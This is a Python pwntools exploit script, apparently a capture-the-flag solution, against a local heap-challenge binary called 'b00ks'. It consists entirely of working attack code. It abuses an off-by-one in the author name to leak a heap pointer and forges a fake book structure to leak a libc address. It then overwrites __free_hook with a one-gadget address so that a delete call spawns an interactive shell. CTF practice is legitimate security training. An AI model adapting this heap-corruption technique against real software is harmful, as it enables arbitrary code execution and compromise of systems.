#!/usr/bin/env python
# coding=utf-8
from pwn import *

payload = 'A'*32

io = process('./b00ks')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# Wait for debugger
pid = util.proc.pidof(io)[0]
print "The pid is: " + str(pid)
#util.proc.wait_for_debugger(pid)

# Create book1
log.info(io.recvuntil('Enter author name: '))
io.sendline(payload)
log.info(io.recvuntil('> '))					##1
io.sendline('1')
log.info(io.recvuntil('book name size: '))
io.sendline('32')
log.info(io.recvuntil('(Max 32 chars): '))
io.sendline('book1')
log.info(io.recvuntil('description size: '))
io.sendline('256')
log.info(io.recvuntil('description: '))
io.sendline('description1')
log.info(io.recvuntil('> '))					##2
io.sendline('4')
log.info(io.recvuntil('A'*32))
book1_addr = u64(io.recvn(6).ljust(8,'\x00'))
print hex(book1_addr)
book2_addr = book1_addr + 0x70

# Create book2
log.info(io.recvuntil('> '))					##3
io.sendline('1')
log.info(io.recvuntil('book name size: '))
io.sendline('32')
log.info(io.recvuntil('(Max 32 chars): '))
io.sendline('book2')
log.info(io.recvuntil('description size: '))
io.sendline(str(0x40000)) 
log.info(io.recvuntil('description: '))
io.sendline('description2')

# Modify book1 to construct fake book
log.info(io.recvuntil('> '))					##4
io.sendline('3')
log.info(io.recvuntil('want to edit: '))
io.sendline('1')
log.info(io.recvuntil('book description: '))
io.sendline('A'*0xb0 + p64(1)+ p64(book2_addr) + p64(book2_addr) + p64(0xffff))

# Change book1 addr to point to fake book
log.info(io.recvuntil('> '))					##5
io.sendline('5')
log.info(io.recvuntil('Enter author name: '))
io.sendline('A'*32)

# leak mmap base addr
log.info(io.recvuntil('> '))					##6
io.sendline('4')
log.info(io.recvuntil('Name: '))
bk2_des_addr = u64(io.recvn(6).ljust(8,'\x00'))

libc_addr = bk2_des_addr - 0x58e010
free_hook_addr = libc_addr + 0x003c67a8
sh = libc_addr + 0x4526a

print hex(libc_addr)
print hex(free_hook_addr)
print(sh)

# Modify book1 to change description ptr of book2
log.info(io.recvuntil('> '))					##7
io.sendline('3')
log.info(io.recvuntil('want to edit: '))
io.sendline('1')
log.info(io.recvuntil('book description: '))
io.sendline(p64(free_hook_addr))

# Modify book2 to change description to sh addr
log.info(io.recvuntil('> '))					##8
io.sendline('3')
log.info(io.recvuntil('want to edit: '))
io.sendline('2')
log.info(io.recvuntil('book description: '))
io.sendline(p64(sh))
# free
log.info(io.recvuntil('> '))					##9
io.sendline('2')
log.info(io.recvuntil('to delete: '))
io.sendline('2')

io.interactive()


